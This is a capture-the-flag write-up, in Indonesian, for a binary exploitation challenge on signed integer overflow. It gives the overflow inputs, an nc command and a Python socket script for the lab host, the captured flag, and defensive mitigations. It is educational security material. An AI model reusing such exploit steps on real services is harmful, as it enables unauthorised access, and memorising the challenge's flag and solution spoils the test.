# 382 - two-sum (Binary Exploitation, picoCTF 2023, Medium)

## Challenge Metadata
- ID: 382 | Event: picoCTF 2023 | Author: CyLab Academy
- Category: Binary Exploitation | Difficulty: Medium (2) | Points: 200
- Flag: `academy{Tw0_Sum_Integer_Bu773R_0v3rfl0w_d95e96f0}`

## Problem Statement & Scope
Tantangan menyajikan kode sumber C (`flag.c`) yang mengimplementasikan program pemeriksaan penambahan dua bilangan bulat positif. Peserta diminta memasukkan dua bilangan positif `n1` dan `n2` sehingga memenuhi kondisi paradoks logika aritmetika:
`n1 > n1 + n2 OR n2 > n1 + n2`

## Teori & Akar Kerentanan (Root Cause)
1. **Representasi Bilangan Bulat Bertanda (Signed 32-bit Two's Complement):**
   Pada arsitektur komputer standar x86/x86_64, tipe data `int` berukuran 32-bit dengan rentang representasi $-2^{31}$ hingga $2^{31}-1$ (`-2147483648` s.d. `2147483647` / `INT_MAX`).
2. **Perilaku Signed Integer Overflow:**
   Ketika dua bilangan positif besar dijumlahkan dan hasilnya melebihi `2147483647`, bit tanda (sign bit ke-31) bernilai 1. Dalam representasi Two's Complement, nilai tersebut dianggap sebagai angka negatif:
   $$2147483647 + 1 = -2147483648$$
3. **Bypass Logika Pemeriksaan:**
   Fungsi `addIntOvf(sum, num1, num2)` dalam `flag.c` melakukan pengecekan:
   ```c
   static int addIntOvf(int result, int a, int b) {
       result = a + b;
       if(a > 0 && b > 0 && result < 0)
           return -1;
       ...
   }
   ```
   Ketika nilai `result` bernilai negatif sementara `a` dan `b` positif, fungsi mengembalikan `-1`, menandakan bahwa integer overflow terpicu. Program kemudian mengeksekusi blok pengambilan file `flag.txt`.

## Rekonstruksi Eksploitasi Step-by-Step
1. **Analisis Source Code:**
   Menentukan nilai batas `INT_MAX` pada sistem C 32-bit: `2147483647`.
2. **Pemilihan Nilai Uji:**
   - `num1 = 2147483647` (positif)
   - `num2 = 1` (positif)
   - Hasil penjumlahan: $2147483647 + 1 = -2147483648$ (negatif).
   - Kondisi $2147483647 > -2147483648$ terpenuhi secara mutlak.
3. **Koneksi dan Injeksi Input:**
   Menghubungkan socket ke instans lab:
   ```bash
   nc xebec.cylabacademy.net <port>
   # Masukkan: 2147483647 1
   ```
   Program merespons:
   `You have an integer overflow`
   `YOUR FLAG IS: academy{Tw0_Sum_Integer_Bu773R_0v3rfl0w_d95e96f0}`

## Script Reproduksi & PoC
Implementasi otomasi Python lengkap tersedia pada `scripts/solve_382_two_sum.py`:
```python
import socket

s = socket.create_connection(("xebec.cylabacademy.net", 29746), timeout=20)
s.recv(1024)
s.sendall(b"2147483647 1\n")
data = s.recv(4096)
print(data.decode())
```

## Mitigasi Defensif & Relevansi LKS Cyber Security
1. **Pemeriksaan Overflow Sebelum Operasi (Safe Math):**
   Operasi penambahan aritmetika harus diverifikasi sebelum dilakukan:
   ```c
   if (num1 > INT_MAX - num2) {
       // Tangani error overflow sebelum penjumlahan dieksekusi
   }
   ```
2. **Penggunaan Builtin Compiler Sanitizer:**
   Menggunakan fungsi bawaan compiler modern seperti `__builtin_add_overflow(num1, num2, &sum)` atau mengaktifkan flag `-fsanitize=signed-integer-overflow` saat tahap kompilasi.
3. **Relevansi Modul LKS:**
   Materi ini adalah konsep esensial dalam modul Binary Exploitation & Secure Coding LKS, mengajarkan batasan tipe primitif memori CPU dan dampak manipulasi aritmetika terhadap kendali alur eksekusi aplikasi.
